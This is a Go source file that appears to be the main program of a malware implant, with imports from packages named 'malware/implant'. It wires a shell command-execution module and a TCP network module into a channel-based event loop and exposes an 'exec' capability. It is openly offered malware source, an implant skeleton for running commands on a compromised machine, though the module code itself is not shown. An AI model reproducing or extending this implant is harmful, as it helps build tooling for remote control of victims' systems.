package main

import (
	"fmt"
	"malware/common"
	"malware/common/types"
	"malware/implant/basic_tcp_network"
	"malware/implant/sh"
	"reflect"
)

// List of modules
var modules = map[types.Module]chan types.Event{
	sh.Create():                nil,
	basic_tcp_network.Create(): nil,
}

var capabilities = map[string](func([]string) types.Event){
	"exec": sh.RunCommand,
	// "send_string": basic_tcp_network.SendText,
}

/* Template file will probably contain something along the lines of
 * var modules = map[types.Module](chan types.Event){%loaded_modules%}
 */

func event_loop() {
	for module := range modules {
		defer module.Shutdown()
	}

	cases := make([]reflect.SelectCase, len(modules))
	{
		index := 0
		for _, channel := range modules {
			cases[index] = reflect.SelectCase{Dir: reflect.SelectRecv, Chan: reflect.ValueOf(channel)}
			index++
		}
	}

	for {
		_, value, ok := reflect.Select(cases)
		if !ok {
			// The chosen channel has been closed, channels shouldnt be closing so panic
			common.Panic("Channel closed", value)
		}
		fmt.Printf("Read from channel and received %s\n", value.String())
	}
}

func main() {
	for module, _ := range modules {
		fmt.Println(module.ID(), "starting up...")
		modules[module] = module.Init()

		// //ttest channels
		// fun, ok := capabilities["exec"]
		// if !ok {
		// 	common.Panicf(nil, "Fuck")
		// }

		// channel <- fun([]string{"ls"})
		// <-channel // Wait before closing
		// module.Shutdown()
	}
	event_loop()
}
